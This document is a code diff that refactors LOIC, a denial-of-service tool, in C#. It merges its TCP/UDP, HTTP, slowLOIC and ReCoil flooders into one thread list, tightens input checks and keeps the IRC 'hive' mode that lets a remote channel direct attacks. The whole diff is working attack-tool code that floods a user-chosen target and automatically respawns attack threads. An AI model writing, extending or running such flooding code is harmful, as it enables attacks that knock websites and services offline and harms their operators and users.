@@ -4,9 +4,11 @@
  */
 
 using System;
+using System.Diagnostics;
 using System.Collections.Generic;
 using System.Collections.Specialized;
 using System.Net;
+using System.Net.Sockets;
 using System.Text.RegularExpressions;
 using System.Threading;
 using System.Windows.Forms;
@@ -18,14 +20,13 @@ namespace LOIC
 	{
 		const string AttackText = "IMMA CHARGIN MAH LAZER";
 
-		private XXPFlooder[] xxp;
-		private HTTPFlooder[] http;
-		private List<cHLDos> lLoic = new List<cHLDos>();
+		private List<IFlooder> arr = new List<IFlooder>();
 		private StringCollection aUpOLSites = new StringCollection();
 		private StringCollection aDownOLSites = new StringCollection();
 		private bool bIsHidden = false;
 		private string sIP, sMethod, sData, sSubsite, sTargetDNS = "", sTargetIP = "";
-		private int iPort, iThreads, iProtocol, iDelay, iTimeout, iSockspThread;
+		private int iPort, iThreads, iDelay, iTimeout, iSockspThread;
+		private Protocol protocol;
 		private bool bResp, intShowStats;
 		private IrcClient irc;
 		private Thread irclisten;
@@ -89,42 +90,55 @@ namespace LOIC
 		/// <param name="silent">Whether to silence error output.</param>
 		private void Attack(bool toggle, bool on, bool silent = false)
 		{
-			if ((cmdAttack.Text == AttackText && toggle == true) || (toggle == false && on == true))
+			if((cmdAttack.Text == AttackText && toggle) || (!toggle && on))
 			{
 				try
 				{
-					try { iPort = Convert.ToInt32(txtPort.Text); }
-					catch { throw new Exception("I don't think ports are supposed to be written like THAT."); }
+					// Protect against race condition
+					if(tShowStats.Enabled) tShowStats.Stop();
 
-					try { iThreads = Convert.ToInt32(txtThreads.Text); }
-					catch { throw new Exception("What on earth made you put THAT in the threads field?"); }
+					if (!int.TryParse (txtPort.Text, out iPort) || iPort < 0 || iPort > 65535) {
+						Wtf ("I don't think ports are supposed to be written like THAT.", silent);
+						return;
+					}
+
+					if (!int.TryParse (txtThreads.Text, out iThreads) || iThreads < 1 || iThreads > 99) {
+						Wtf ("What on earth made you put THAT in the threads field?", silent);
+						return;
+					}
 
 					sIP = txtTarget.Text;
 					if (String.IsNullOrEmpty(sIP) || String.Equals(sIP, "N O N E !"))
 						throw new Exception("Select a target.");
 
-					iProtocol = 0;
 					sMethod = cbMethod.Text;
-					if (String.Equals(sMethod, "TCP")) iProtocol = 1;
-					if (String.Equals(sMethod, "UDP")) iProtocol = 2;
-					if (String.Equals(sMethod, "HTTP")) iProtocol = 3;
-					if (String.Equals(sMethod, "slowLOIC")) iProtocol = 4;
-					if (String.Equals(sMethod, "ReCoil")) iProtocol = 5;
+					protocol = Protocol.None;
+					try {
+						protocol = (Protocol) Enum.Parse (typeof (Protocol), sMethod, true);
+						// Analysis disable once EmptyGeneralCatchClause
+					} catch { }
+					if(protocol == Protocol.None) {
+						Wtf ("Select a proper attack method.", silent);
+						return;
+					}
 
-					if (iProtocol == 0)
-						throw new Exception("Select a proper attack method.");
-
-					sData = txtData.Text.Replace("\\r", "\r").Replace("\\n", "\n");
-					if (String.IsNullOrEmpty(sData) && (iProtocol == 1 || iProtocol == 2))
-						throw new Exception("Gonna spam with no contents? You're a wise fellow, aren't ya? o.O");
+					sData = txtData.Text.Replace(@"\r", "\r").Replace(@"\n", "\n");
+					if(String.IsNullOrEmpty(sData) && (protocol == Protocol.TCP || protocol == Protocol.UDP)) {
+						Wtf ("Gonna spam with no contents? You're a wise fellow, aren't ya? o.O", silent);
+						return;
+					}
 
 					sSubsite = txtSubsite.Text;
-					if (!sSubsite.StartsWith("/") && (iProtocol >= 3))
-						throw new Exception("You have to enter a subsite (for example \"/\")");
+					if (!sSubsite.StartsWith ("/") && ((int)protocol >= (int)Protocol.HTTP)) {
+						Wtf ("You have to enter a subsite (for example \"/\")", silent);
+						return;
+					}
 
-					try { iTimeout = Convert.ToInt32(txtTimeout.Text); }
-					catch { throw new Exception("What's up with something like that in the timeout box? =S"); }
-					if (iTimeout > 1000)
+					if (!int.TryParse (txtTimeout.Text, out iTimeout) || iTimeout < 1) {
+						Wtf ("What's up with something like that in the timeout box? =S", silent);
+						return;
+					}
+					if (iTimeout > 999)
 					{
 						iTimeout = 30;
 						txtTimeout.Text = "30";
@@ -135,15 +149,16 @@ namespace LOIC
 					sTargetDNS = txtTargetURL.Text;
 					sTargetIP = txtTargetIP.Text;
 
-					if (iProtocol == 4 || iProtocol == 5)
+					if (protocol == Protocol.slowLOIC || protocol == Protocol.ReCoil)
 					{
 						try { iSockspThread = Convert.ToInt32(txtSLSpT.Text); }
 						catch { throw new Exception("A number is fine too!"); }
 					}
 				}
-				catch (Exception ex) {
-					if (silent) return;
-					new frmWtf().Show(); MessageBox.Show(ex.Message, "What the shit."); return;
+				catch (Exception ex)
+				{
+					Wtf (ex.Message, silent);
+					return;
 				}
 
 				cmdAttack.Text = "Stop flooding";
@@ -156,53 +171,47 @@ namespace LOIC
 				chkResp.Enabled = false;
 				txtSLSpT.Enabled = false;
 
-				if (String.Equals(sMethod, "TCP") || String.Equals(sMethod, "UDP"))
+				if (arr.Count > 0)
 				{
-					xxp = new XXPFlooder[iThreads];
-					for (int a = 0; a < xxp.Length; a++)
+					for (int a = (arr.Count - 1); a >= 0; a--)
 					{
-						xxp[a] = new XXPFlooder(sIP, iPort, iProtocol, iDelay, bResp, sData, chkMsgRandom.Checked);
-						xxp[a].Start();
+						arr[a].Stop();
+						arr[a].IsFlooding = false;
 					}
+					arr.Clear();
 				}
-				if (String.Equals(sMethod, "HTTP"))
+
+				for (int i = 0; i < iThreads; i++)
 				{
-					http = new HTTPFlooder[iThreads];
-					for (int a = 0; a < http.Length; a++)
+					IFlooder ts = null;
+
+					if (protocol == Protocol.ReCoil)
 					{
-						http[a] = new HTTPFlooder(sTargetDNS, sTargetIP, iPort, sSubsite, bResp, iDelay, iTimeout, chkRandom.Checked, chkUsegZip.Checked);
-						http[a].Start();
+						ts = new ReCoil(sTargetDNS, sTargetIP, iPort, sSubsite, iDelay, iTimeout, chkRandom.Checked, bResp, iSockspThread, chkUsegZip.Checked);
 					}
-				}
-				if ((iProtocol == 4) || (iProtocol == 5))
-				{
-					if (lLoic.Count > 0)
+					if (protocol == Protocol.slowLOIC)
 					{
-						for (int a = (lLoic.Count - 1); a >= 0; a--)
-						{
-							lLoic[a].IsFlooding = false;
-						}
+						ts = new SlowLoic(sTargetDNS, sTargetIP, iPort, sSubsite, iDelay, iTimeout, chkRandom.Checked, iSockspThread, true, chkUseGet.Checked, chkUsegZip.Checked);
 					}
-					lLoic.Clear();
-					cHLDos ts;
-					for (int i = 0; i < iThreads; i++)
+					if (protocol == Protocol.HTTP)
 					{
-						if (iProtocol == 5)
-						{
-							ts = new ReCoil(sTargetDNS, sTargetIP, iPort, sSubsite, iDelay, iTimeout, chkRandom.Checked, bResp, iSockspThread, chkUsegZip.Checked);
-						}
-						else
-						{
-							ts = new SlowLoic(sTargetDNS, sTargetIP, iPort, sSubsite, iDelay, iTimeout, chkRandom.Checked, iSockspThread, true, chkUseGet.Checked, chkUsegZip.Checked);
-						}
+						ts = new HTTPFlooder(sTargetDNS, sTargetIP, iPort, sSubsite, bResp, iDelay, iTimeout, chkRandom.Checked, chkUsegZip.Checked);
+					}
+					if ((int)protocol == 2 || (int)protocol == 1)
+					{
+						ts = new XXPFlooder(sIP, iPort, (int)protocol, iDelay, bResp, sData, chkMsgRandom.Checked);
+					}
+
+					if(ts != null)
+					{
 						ts.Start();
-						lLoic.Add(ts);
+						arr.Add(ts);
 					}
 				}
 
 				tShowStats.Start();
 			}
-			else if (toggle == true || on == false)
+			else if(toggle || !on)
 			{
 				cmdAttack.Text = AttackText;
 				chkUsegZip.Enabled = true;
@@ -212,29 +221,31 @@ namespace LOIC
 				cbMethod.Enabled = true;
 				chkResp.Enabled = true;
 				txtSLSpT.Enabled = true;
-				if (xxp != null)
+
+				if (arr != null && arr.Count > 0)
 				{
-					for (int a = 0; a < xxp.Length; a++)
+					for (int a = (arr.Count - 1); a >= 0; a--)
 					{
-						xxp[a].IsFlooding = false;
+						arr[a].Stop();
+						arr[a].IsFlooding = false;
 					}
 				}
-				if (http != null)
-				{
-					for (int a = 0; a < http.Length; a++)
-					{
-						http[a].IsFlooding = false;
-					}
-				}
-				if (lLoic.Count > 0)
-				{
-					for (int a = (lLoic.Count - 1); a >= 0; a--)
-					{
-						lLoic[a].IsFlooding = false;
-					}
-				}
-				//tShowStats.Stop();
 			}
+		}
+
+		/// <summary>
+		/// What the fuck?
+		/// </summary>
+		/// <param name="message">Message.</param>
+		/// <param name="silent">If set to <c>true</c> silent.</param>
+		private void Wtf(string message, bool silent = false)
+		{
+			if (silent) {
+				return;
+			}
+
+			new frmWtf().Show();
+			MessageBox.Show(message, "What the shit.");
 		}
 
 		/// <summary>
@@ -245,9 +256,7 @@ namespace LOIC
 		{
 			if (txtTargetIP.Text.Length == 0)
 			{
-				if (silent) return;
-				new frmWtf().Show();
-				MessageBox.Show("I think you forgot the IP.", "What the shit.");
+				Wtf ("I think you forgot the IP.", silent);
 				return;
 			}
 			txtTarget.Text = txtTargetIP.Text;
@@ -262,9 +271,7 @@ namespace LOIC
 			string url = txtTargetURL.Text.ToLowerInvariant();
 			if (url.Length == 0)
 			{
-				if (silent) return;
-				new frmWtf().Show();
-				MessageBox.Show("A URL is fine too...", "What the shit.");
+				Wtf ("A URL is fine too...", silent);
 				return;
 			}
 			if (url.StartsWith("https://")) url = url.Replace("https://", "http://");
@@ -277,9 +284,7 @@ namespace LOIC
 			}
 			catch (Exception)
 			{
-				if (silent) return;
-				new frmWtf().Show();
-				MessageBox.Show("The URL you entered does not resolve to an IP!", "What the shit.");
+				Wtf ("The URL you entered does not resolve to an IP!", silent);
 				return;
 			}
 		}
@@ -300,12 +305,11 @@ namespace LOIC
 				else if (enabled)
 				{
 					try { IPHostEntry ipHost = Dns.GetHostEntry(txtIRCserver.Text); }
-					catch (Exception) { disableHive.Checked = true; }
+					catch { disableHive.Checked = true; }
 				}
 				if (disableHive.Checked && enabled)
 				{
-					new frmWtf().Show();
-					MessageBox.Show("Did you filled IRC options correctly?", "What the shit.");
+					Wtf ("Did you fill IRC options correctly?");
 					return;
 				}
 
@@ -319,22 +323,24 @@ namespace LOIC
 				if (enabled)
 				{
 					SetStatus("Connecting..");
-					irc = new IrcClient();
-					irc.OnConnected += IrcConnected;
-					irc.OnReadLine += OnReadLine;
-					irc.OnChannelMessage += OnMessage;
-					irc.OnOp += OnOp;
-					irc.OnDeop += OnDeOp;
-					irc.OnPart += OnPart;
-					irc.OnNickChange += OnNickChange;
-					irc.OnTopic += OnTopic;
-					irc.OnTopicChange += OnTopicChange;
-					irc.OnQuit += OnQuit;
-					irc.OnKick += OnKick;
-					irc.OnDisconnected += IrcDisconnected;
-					irc.OnNames += OnNames;
-					irc.AutoRejoinOnKick = true;
-					irc.AutoRejoin = true;
+					if (irc == null) {
+						irc = new IrcClient();
+						irc.OnConnected += IrcConnected;
+						irc.OnReadLine += OnReadLine;
+						irc.OnChannelMessage += OnMessage;
+						irc.OnOp += OnOp;
+						irc.OnDeop += OnDeOp;
+						irc.OnPart += OnPart;
+						irc.OnNickChange += OnNickChange;
+						irc.OnTopic += OnTopic;
+						irc.OnTopicChange += OnTopicChange;
+						irc.OnQuit += OnQuit;
+						irc.OnKick += OnKick;
+						irc.OnDisconnected += IrcDisconnected;
+						irc.OnNames += OnNames;
+						irc.AutoRejoinOnKick = true;
+						irc.AutoRejoin = true;
+					}
 					try
 					{
 						int port;
@@ -345,9 +351,10 @@ namespace LOIC
 						irc.Login("LOIC_" + Functions.RandomString(), "Newfag's remote LOIC", 0, "IRCLOIC");
 
 						// Spawn a thread to handle the listen.
-						irclisten = new Thread(new ThreadStart(IrcListenThread));
+						irclisten = new Thread(IrcListenThread);
 						irclisten.Start();
 					}
+					// Analysis disable once EmptyGeneralCatchClause
 					catch
 					{ }
 				}
@@ -357,6 +364,7 @@ namespace LOIC
 					{
 						if (irc != null) irc.Disconnect();
 					}
+					// Analysis disable once EmptyGeneralCatchClause
 					catch
 					{ }
 					SetStatus("Disconnected.");
@@ -803,6 +811,7 @@ namespace LOIC
 				if (irclisten != null) irclisten.Abort();
 				if (irc != null) irc.Disconnect();
 			}
+			// Analysis disable once EmptyGeneralCatchClause
 			catch
 			{ }
 			finally
@@ -860,182 +869,127 @@ namespace LOIC
 		{
 			if (intShowStats) return; intShowStats = true;
 
+			int iIdle = 0;
+			int iConnecting = 0, iRequesting = 0, iDownloading = 0;
+			int iDownloaded = 0, iRequested = 0, iFailed = 0;
+
 			bool isFlooding = false;
 			if (cmdAttack.Text == "Stop flooding")
 				isFlooding = true;
-			if (iProtocol == 1 || iProtocol == 2)
-			{
-				int iFloodCount = 0;
-				int iFailed = 0;
-				for (int a = 0; a < xxp.Length; a++)
-				{
-					iFloodCount += xxp[a].FloodCount;
-					iFailed += xxp[a].Failed;
-					if (isFlooding && !xxp[a].IsFlooding)
-					{
-						xxp[a].Start();
-					}
-				}
-				lbRequested.Text = iFloodCount.ToString();
-				lbFailed.Text = iFailed.ToString();
-				if (!bIsHidden && TrayIcon.Visible)
-				{
-					if (isFlooding)
-					{
-						string tst = "Target: " + ((sTargetDNS == "") ? sTargetIP : (sTargetDNS + "(" + sTargetIP + ")"));
-						if (tst.Length > 63)
-							tst = tst.Substring(0, 63);
-						TrayIcon.Text = tst;
-						TrayIcon.BalloonTipTitle = tst;
-						tst = "requested: " + iFloodCount.ToString() + Environment.NewLine
-							+ "failed: " + iFailed.ToString();
-						if (tst.Length > 254)
-							tst = tst.Substring(0, 254);
-						TrayIcon.BalloonTipText = tst;
-					}
-					else
-					{
-						TrayIcon.Text = "Waiting for target!";
-						TrayIcon.BalloonTipText = "";
-						TrayIcon.BalloonTipTitle = "";
-					}
-				}
-			}
-			if (iProtocol >= 3)
-			{
-				int iIdle = 0;
-				int iConnecting = 0;
-				int iRequesting = 0;
-				int iDownloading = 0;
-				int iDownloaded = 0;
-				int iRequested = 0;
-				int iFailed = 0;
 
-				if (iProtocol == 3)
+			if(arr != null && arr.Count > 0)
+			{
+				for (int a = (arr.Count - 1); a >= 0; a--)
 				{
-					for (int a = 0; a < http.Length; a++)
+					if(arr[a] != null && (arr[a] is cHLDos))
 					{
-						iDownloaded += http[a].Downloaded;
-						iRequested += http[a].Requested;
-						iFailed += http[a].Failed;
-						if (http[a].State == ReqState.Completed)
+						cHLDos c = (cHLDos)arr[a];
+
+						iDownloaded += c.Downloaded;
+						iRequested += c.Requested;
+						iFailed += c.Failed;
+						if(c.State == ReqState.Ready ||
+							c.State == ReqState.Completed)
 							iIdle++;
-						if (http[a].State == ReqState.Connecting)
+						if (c.State == ReqState.Connecting)
 							iConnecting++;
-						if (http[a].State == ReqState.Requesting)
+						if (c.State == ReqState.Requesting)
 							iRequesting++;
-						if (http[a].State == ReqState.Downloading)
+						if (c.State == ReqState.Downloading)
 							iDownloading++;
-						if (isFlooding && !http[a].IsFlooding)
+
+						if (isFlooding && !c.IsFlooding)
 						{
-							int iaDownloaded = http[a].Downloaded;
-							int iaRequested = http[a].Requested;
-							int iaFailed = http[a].Failed;
-							http[a] = null;
-							http[a] = new HTTPFlooder(sTargetDNS, sTargetIP, iPort, sSubsite, bResp, iDelay, iTimeout, chkRandom.Checked, chkUsegZip.Checked);
-							http[a].Downloaded = iaDownloaded;
-							http[a].Requested = iaRequested;
-							http[a].Failed = iaFailed;
-							http[a].Start();
-						}
-					}
-				}
-				else if ((iProtocol == 5) || (iProtocol == 4))
-				{
-					for (int a = (lLoic.Count - 1); a >= 0; a--)
-					{
-						iDownloaded += lLoic[a].Downloaded;
-						iRequested += lLoic[a].Requested;
-						iFailed += lLoic[a].Failed;
-						if (lLoic[a].State == ReqState.Completed)
-							iIdle++;
-						if (lLoic[a].State == ReqState.Connecting)
-							iConnecting++;
-						if (lLoic[a].State == ReqState.Requesting)
-							iRequesting++;
-						if (lLoic[a].State == ReqState.Downloading)
-							iDownloading++;
-						if (isFlooding && !lLoic[a].IsFlooding)
-						{
-							int iaDownloaded = lLoic[a].Downloaded;
-							int iaFailed = lLoic[a].Failed;
-							lLoic.RemoveAt(a);
-							cHLDos ts;
-							if (iProtocol == 5)
+							cHLDos ts = null;
+
+							int iaDownloaded = c.Downloaded;
+							int iaRequested = c.Requested;
+							int iaFailed = c.Failed;
+
+							if (protocol == Protocol.ReCoil)
 							{
 								ts = new ReCoil(sTargetDNS, sTargetIP, iPort, sSubsite, iDelay, iTimeout, chkRandom.Checked, bResp, iSockspThread, chkUsegZip.Checked);
 							}
-							else
+							if (protocol == Protocol.slowLOIC)
 							{
 								ts = new SlowLoic(sTargetDNS, sTargetIP, iPort, sSubsite, iDelay, iTimeout, chkRandom.Checked, iSockspThread, true, chkUseGet.Checked, chkUsegZip.Checked);
 							}
-							ts.Downloaded = iaDownloaded;
-							ts.Failed = iaFailed;
-							ts.Start();
-							lLoic.Add(ts);
-						}
-					}
-					if (isFlooding)
-					{
-						while (lLoic.Count < iThreads)
-						{
-							cHLDos ts;
-							if (iProtocol == 5)
+							if (protocol == Protocol.HTTP)
 							{
-								ts = new ReCoil(sTargetDNS, sTargetDNS, iPort, sSubsite, iDelay, iTimeout, chkRandom.Checked, bResp, iSockspThread, chkUsegZip.Checked);
+								ts = new HTTPFlooder(sTargetDNS, sTargetIP, iPort, sSubsite, bResp, iDelay, iTimeout, chkRandom.Checked, chkUsegZip.Checked);
 							}
-							else
+							if ((int)protocol == 2 || (int)protocol == 1)
 							{
-								ts = new SlowLoic(sTargetDNS, sTargetIP, iPort, sSubsite, iDelay, iTimeout, chkRandom.Checked, iSockspThread, true, chkUseGet.Checked, chkUsegZip.Checked);
+								ts = new XXPFlooder(sIP, iPort, (int)protocol, iDelay, bResp, sData, chkMsgRandom.Checked);
 							}
-							ts.Start();
-							lLoic.Add(ts);
-						}
-						if (lLoic.Count > iThreads)
-						{
-							for (int a = (lLoic.Count - 1); a >= iThreads; a--)
+
+							if(ts != null)
 							{
-								lLoic[a].Stop();
-								lLoic.RemoveAt(a);
+								arr[a].Stop();
+								arr[a].IsFlooding = false;
+
+								arr.RemoveAt(a);
+
+								ts.Downloaded = iaDownloaded;
+								ts.Requested = iaRequested;
+								ts.Failed = iaFailed;
+								ts.Start();
+
+								arr.Add(ts);
 							}
 						}
 					}
 				}
-				lbFailed.Text = iFailed.ToString();
-				lbRequested.Text = iRequested.ToString();
-				lbDownloaded.Text = iDownloaded.ToString();
-				lbDownloading.Text = iDownloading.ToString();
-				lbRequesting.Text = iRequesting.ToString();
-				lbConnecting.Text = iConnecting.ToString();
-				lbIdle.Text = iIdle.ToString();
-				if (!bIsHidden && TrayIcon.Visible)
+				if (isFlooding)
 				{
-					if (isFlooding)
+					while (arr.Count < iThreads)
 					{
-						string tst = "Target: " + ((sTargetDNS == "") ? sTargetIP : (sTargetDNS + "(" + sTargetIP + ")"));
-						if(tst.Length > 63)
-							tst = tst.Substring(0,63);
-						TrayIcon.Text = tst;
-						TrayIcon.BalloonTipTitle = tst;
-						tst = "Idle: " + iIdle.ToString() + Environment.NewLine
-							+ "Connecting: " + iConnecting.ToString() + Environment.NewLine
-							+ "Requesting: " + iRequesting.ToString() + Environment.NewLine
-							+ "Downloading: " + iDownloading.ToString() + Environment.NewLine + Environment.NewLine
-							+ "downloaded: " + iDownloaded.ToString() + Environment.NewLine
-							+ "requested: " + iRequested.ToString() + Environment.NewLine
-							+ "failed: " + iFailed.ToString();
-						if(tst.Length > 254)
-							tst = tst.Substring(0,254);
-						TrayIcon.BalloonTipText = tst;
+						IFlooder ts = null;
+
+						if (protocol == Protocol.ReCoil)
+						{
+							ts = new ReCoil(sTargetDNS, sTargetIP, iPort, sSubsite, iDelay, iTimeout, chkRandom.Checked, bResp, iSockspThread, chkUsegZip.Checked);
+						}
+						if (protocol == Protocol.slowLOIC)
+						{
+							ts = new SlowLoic(sTargetDNS, sTargetIP, iPort, sSubsite, iDelay, iTimeout, chkRandom.Checked, iSockspThread, true, chkUseGet.Checked, chkUsegZip.Checked);
+						}
+						if (protocol == Protocol.HTTP)
+						{
+							ts = new HTTPFlooder(sTargetDNS, sTargetIP, iPort, sSubsite, bResp, iDelay, iTimeout, chkRandom.Checked, chkUsegZip.Checked);
+						}
+						if ((int)protocol == 2 || (int)protocol == 1)
+						{
+							ts = new XXPFlooder(sIP, iPort, (int)protocol, iDelay, bResp, sData, chkMsgRandom.Checked);
+						}
+
+						if(ts != null)
+						{
+							ts.Start();
+							arr.Add(ts);
+						}
+						else break;
 					}
-					else
+					if (arr.Count > iThreads)
 					{
-						TrayIcon.Text = "Waiting for target!";
-						TrayIcon.BalloonTipText = "";
-						TrayIcon.BalloonTipTitle = "";
+						for (int a = (arr.Count - 1); a >= iThreads; a--)
+						{
+							arr[a].Stop();
+							arr[a].IsFlooding = false;
+
+							arr.RemoveAt(a);
+						}
 					}
 				}
 			}
+
+			lbFailed.Text = iFailed.ToString();
+			lbRequested.Text = iRequested.ToString();
+			lbDownloaded.Text = iDownloaded.ToString();
+			lbDownloading.Text = iDownloading.ToString();
+			lbRequesting.Text = iRequesting.ToString();
+			lbConnecting.Text = iConnecting.ToString();
+			lbIdle.Text = iIdle.ToString();
 
 			intShowStats = false;
 		}
@@ -1048,25 +1002,11 @@ namespace LOIC
 		private void tbSpeed_ValueChanged(object sender, EventArgs e)
 		{
 			iDelay = tbSpeed.Value;
-			if (http != null)
+			if (arr != null && arr.Count > 0)
 			{
-				for (int a = 0; a < http.Length; a++)
+				foreach (IFlooder i in arr)
 				{
-					if (http[a] != null) http[a].Delay = iDelay;
-				}
-			}
-			if (xxp != null)
-			{
-				for (int a = 0; a < xxp.Length; a++)
-				{
-					if (xxp[a] != null) xxp[a].Delay = iDelay;
-				}
-			}
-			if (lLoic.Count > 0)
-			{
-				for (int a = (lLoic.Count - 1); a >= 0; a--)
-				{
-					lLoic[a].Delay = iDelay;
+					if(i != null) i.Delay = iDelay;
 				}
 			}
 		}
@@ -1106,7 +1046,7 @@ namespace LOIC
 		/// <param name="e">EventArgs.</param>
 		private void label24_Click(object sender, EventArgs e)
 		{
-			System.Diagnostics.Process.Start("https://github.com/NewEraCracker/LOIC");
+			Process.Start("https://github.com/NewEraCracker/LOIC");
 		}
 
 		/// <summary>
